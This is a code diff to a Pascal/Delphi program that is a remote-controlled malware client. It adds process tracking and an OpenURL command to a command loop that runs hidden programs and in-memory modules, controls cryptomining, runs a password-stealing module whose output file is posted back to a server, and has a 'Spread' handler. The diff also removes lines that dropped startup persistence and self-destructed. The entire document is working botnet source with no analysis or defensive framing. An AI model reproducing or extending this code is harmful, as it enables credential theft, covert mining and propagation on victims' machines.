@@ -31,6 +31,9 @@ type
 var
   Workers: TWorkers;
   AllowExecution: Boolean = true;
+  IsUninstalling: Boolean = false;
+  IsRestarting:   Boolean = false;
+  IsUpdating:     Boolean = false;
 
 function ExecIndex(CmdID: String): LongInt;
 function FindAPlace: LongInt;
@@ -79,6 +82,7 @@ Begin
     on E: Exception do Result:=0;
   end;
   MS.Free;
+  AddProcessToList(Result);
 end;
 
 //General functions and Command Execution
@@ -207,9 +211,8 @@ Begin
       ToPost.AddFormField('RT', '1');
       ToPost.AddFormField('Result', 'Restarting.');
       DoPost;
-      //We should kill the child processes here...
+      IsRestarting:=True;
       AllowExecution:=False;
-      Restart(FullName);
     end;
     'Update': Begin
       ToPost.AddFormField('RT', '1');
@@ -231,7 +234,8 @@ Begin
       if Not(Error) then Begin
         ToPost.AddFormField('Result', 'File downloaded, update in progress.');
         DoPost;
-        Restart(FullName, True);
+        IsUpdating:=True;
+        AllowExecution:=False;
       end;
     end;
     'Uninstall': Begin
@@ -239,11 +243,8 @@ Begin
       ToPost.AddFormField('RT', '1');
       ToPost.AddFormField('Result','Uninstalling...');
       DoPost;
-      Reg_RemoveFromStartup;
-      DeleteTask('WinManager');
-      ChDel(StartupFolder+'\'+InternalName);
-      Selfdestruct;
-      Halt(0);
+      IsUninstalling:=True;
+      AllowExecution:=False;
     end;
     'Upload': Begin
       if FileExists(Net.Commands.ReadString(FCmdID, 'FileName', '')) then Begin
@@ -297,12 +298,14 @@ Begin
             Master.ShowWindow:=swoHIDE;
             Master.InheritHandles:=False;
             Master.Execute;
+            AddProcessToList(Master.ProcessID);
             ToPost.AddFormField('Result', 'Execution successful.');
             ToPost.AddFormField('Continue', 'True');
             DoPost;
             While Not(Terminated) do Begin
               Sleep(100);
             end;
+            RemoveProcessFromList(Master.ProcessID);
             Master.Terminate(0);
             ToPost.AddFormField('RT', '1');
           except
@@ -334,12 +337,15 @@ Begin
       if Not(Error) then Begin
         ModID:=ExecFromMem(FullName, '', MemStream.Memory);
         if ModID>0 then Begin
+          AddProcessToList(ModID);
           ToPost.AddFormField('Result', 'Execution successful.');
           ToPost.AddFormField('Continue', 'True');
           DoPost;
           While Not(Terminated) do Begin
             Sleep(100);
           end;
+          RemoveProcessFromList(ModID);
+          TerminateProcessByID(ModID);
           ToPost.AddFormField('RT', '1');
           ToPost.AddFormField('Result', 'Execution completed.');
         end
@@ -431,6 +437,7 @@ Begin
           While Not(Terminated) do Begin
             Sleep(100);
           end;
+          RemoveProcessFromList(ModID);
           TerminateProcessByID(ModID);
           ToPost.AddFormField('RT', '1');
           ToPost.AddFormField('Result', '['+STemp2+'] stopped mining!');
@@ -450,6 +457,7 @@ Begin
       ModID:=ExecuteModule(Server+PassModule, '/shtml P.html');
       if ModID>0 then Begin
         Sleep(7000);
+        RemoveProcessFromList(ModID);
         if FileExists('P.html') then Begin
           Error:=False;
           ToPost.AddFormField('RT', '2');
@@ -463,6 +471,12 @@ Begin
       DoPost;
       Sleep(700);
       ChDel('P.html');
+    end;
+    'OpenURL': Begin
+      ToPost.AddFormField('RT', '1');
+      OpenURL(Net.Commands.ReadString(FCmdID, 'URL', 'http://google.com'));
+      ToPost.AddFormField('Result', 'URL opened successfully.');
+      DoPost;
     end;
     'Spread': Begin
       ToPost.AddFormField('RT', '1');
@@ -486,7 +500,7 @@ Begin
         DoPost;
       end;
     end
-    else if Not(IsUninstalling) then Begin
+    else Begin
       ToPost.AddFormField('RT', '1');
       ToPost.AddFormField('Result', 'Unknown command!');
       DoPost;
